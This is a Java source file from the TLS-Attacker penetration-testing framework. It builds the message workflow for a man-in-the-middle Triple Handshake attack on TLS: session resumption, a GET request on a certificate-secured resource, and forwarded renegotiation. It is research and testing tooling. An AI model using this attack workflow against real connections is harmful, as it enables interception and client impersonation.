/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.attacks.ths;

import de.rub.nds.tlsattacker.tls.config.ClientCommandConfig;
import de.rub.nds.tlsattacker.tls.config.CommandConfig;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.application.ApplicationMessage;
import de.rub.nds.tlsattacker.tls.protocol.ccs.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.ClientHelloMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.FinishedMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.HelloRequestMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.ServerHelloMessage;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import static de.rub.nds.tlsattacker.tls.workflow.WorkflowConfigurationFactory.initializeProtocolMessageOrder;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import java.util.LinkedList;
import java.util.List;

/**
 * Creates a workflow for synchronizing the verify data (session resumption),
 * sending a GET request on certificate secured resource, handling
 * Man-in-the-Middle renegotiation
 * 
 * @author Philip Riese <philip.riese@rub.de>
 */
public class TripleHandshakeWorkflowConfiguration {

    private final TlsContext tlsContext;
    private final CommandConfig config;

    public TripleHandshakeWorkflowConfiguration(TlsContext tlsContext, CommandConfig config) {
	this.tlsContext = tlsContext;
	this.config = config;
	tlsContext.setSessionResumption(true);
	tlsContext.getDigest().reset();
    }

    public void createWorkflow() {

	ClientCommandConfig ccConfig = (ClientCommandConfig) config;

	WorkflowTrace workflowTrace = new WorkflowTrace();

	List<ProtocolMessage> protocolMessages = new LinkedList<>();

	// session resumption
	protocolMessages.add(new ClientHelloMessage(ConnectionEnd.CLIENT));

	protocolMessages.add(new ServerHelloMessage(ConnectionEnd.SERVER));
	protocolMessages.add(new ChangeCipherSpecMessage(ConnectionEnd.SERVER));
	protocolMessages.add(new FinishedMessage(ConnectionEnd.SERVER));

	protocolMessages.add(new ChangeCipherSpecMessage(ConnectionEnd.CLIENT));
	protocolMessages.add(new FinishedMessage(ConnectionEnd.CLIENT));

	// automatic modification GET on specified path within certSecure
	ApplicationMessage cam = new ApplicationMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(cam);
	cam.setGoingToBeSent(false);

	// Server initiates renegotiation
	HelloRequestMessage hrm = new HelloRequestMessage(ConnectionEnd.SERVER);
	protocolMessages.add(hrm);
	hrm.setOnlyForward(true);

	// forward renegotiation
	ApplicationMessage cam2 = new ApplicationMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(cam2);
	cam2.setOnlyForward(true);

	ApplicationMessage sam = new ApplicationMessage(ConnectionEnd.SERVER);
	protocolMessages.add(sam);
	sam.setOnlyForward(true);

	// it is possible to parse and prepare messages until ServerHelloDone
	// protocolMessages.add(new ClientHelloMessage(ConnectionEnd.CLIENT));
	//
	// protocolMessages.add(new ServerHelloMessage(ConnectionEnd.SERVER));
	// protocolMessages.add(new CertificateMessage(ConnectionEnd.SERVER));
	//
	// if (tlsContext.getSelectedCipherSuite().isEphemeral()) {
	// protocolMessages.add(new
	// DHEServerKeyExchangeMessage(ConnectionEnd.SERVER));
	// }
	//
	// protocolMessages.add(new
	// CertificateRequestMessage(ConnectionEnd.SERVER));
	// protocolMessages.add(new
	// ServerHelloDoneMessage(ConnectionEnd.SERVER));

	// only forward ClientCertificate, ClientKeyExchange, CertificateVerify,
	// CCS and ClientFinished
	ApplicationMessage cam3 = new ApplicationMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(cam3);
	cam3.setOnlyForward(true);

	// forward CCS, ServerFinished and ApplicationMessage
	ApplicationMessage sam2 = new ApplicationMessage(ConnectionEnd.SERVER);
	protocolMessages.add(sam2);
	sam2.setOnlyForward(true);

	workflowTrace.setProtocolMessages(protocolMessages);

	tlsContext.setWorkflowTrace(workflowTrace);

	initializeProtocolMessageOrder(tlsContext);
    }

}
